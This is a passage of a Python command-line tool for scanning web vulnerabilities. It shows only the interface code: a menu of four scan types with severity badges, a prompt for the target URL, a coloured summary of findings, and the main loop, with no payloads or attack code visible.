def show_menu():
    print(f"\n  {DIM}Select vulnerability type:{RESET}\n")
    labels = {
        "1": ("CRITICAL", RED),
        "2": ("HIGH",     YELLOW),
        "3": ("HIGH",     YELLOW),
        "4": ("MEDIUM",   BLUE),
    }
    icons = {"1": "🗄", "2": "📜", "3": "🔄", "4": "🔍"}
    for key, (name, sev, _) in SCAN_TYPES.items():
        color = labels[key][1]
        badge = labels[key][0]
        print(f"  {DIM}[{RESET}{WHITE}{key}{RESET}{DIM}]{RESET}  {icons[key]}  {WHITE}{name:<20}{RESET}  {color}{badge}{RESET}")
    print()


def get_url():
    while True:
        url = input(f"  {CYAN}Target URL{RESET} {DIM}(e.g. https://example.com/login){RESET}: ").strip()
        if not url:
            print(f"  {RED}URL cannot be empty.{RESET}")
            continue
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return url


def summary(all_findings):
    separator()
    total = sum(len(v) for v in all_findings.values())
    print(f"\n  {BOLD}{WHITE}Scan Summary{RESET}")
    separator()
    for scan_name, findings in all_findings.items():
        status = f"{RED}VULNERABLE ({len(findings)} issue(s)){RESET}" if findings else f"{GREEN}CLEAN{RESET}"
        print(f"  {DIM}{scan_name:<25}{RESET} {status}")
    print()
    if total:
        print(f"  {RED}{BOLD}Total issues found: {total}{RESET}")
    else:
        print(f"  {GREEN}{BOLD}No vulnerabilities detected.{RESET}")
    print(f"  {DIM}Note: This scanner performs non-destructive, passive checks only.{RESET}\n")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)
    session = make_session()

    while True:
        show_menu()
        choice = input(f"  {CYAN}Choose scan type{RESET} {DIM}[1-4, or 'all' / 'q' to quit]{RESET}: ").strip().lower()

        if choice == "q":
            print(f"\n  {DIM}Goodbye.{RESET}\n")
            sys.exit(0)

        if choice not in SCAN_TYPES and choice != "all":
            print(f"  {RED}Invalid choice. Enter 1-4, 'all', or 'q'.{RESET}\n")
            continue

        url = get_url()
        print()

        all_findings = {}

        if choice == "all":
            for key, (name, sev, scanner) in SCAN_TYPES.items():
                print(f"\n  {BOLD}{CYAN}── {name} ({sev}) ────────────────────{RESET}")
                time.sleep(0.3)
                findings = scanner(url, session)
                all_findings[name] = findings
            summary(all_findings)
        else:
            name, sev, scanner = SCAN_TYPES[choice]
            print(f"\n  {BOLD}{CYAN}── {name} ({sev}) ────────────────────{RESET}")
            time.sleep(0.3)
            findings = scanner(url, session)
            all_findings[name] = findings
            summary(all_findings)

        again = input(f"  Run another scan? {DIM}[y/n]{RESET}: ").strip().lower()
        if again != "y":
            print(f"\n  {DIM}Goodbye.{RESET}\n")
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Interrupted. Exiting.{RESET}\n")
        sys.exit(0)
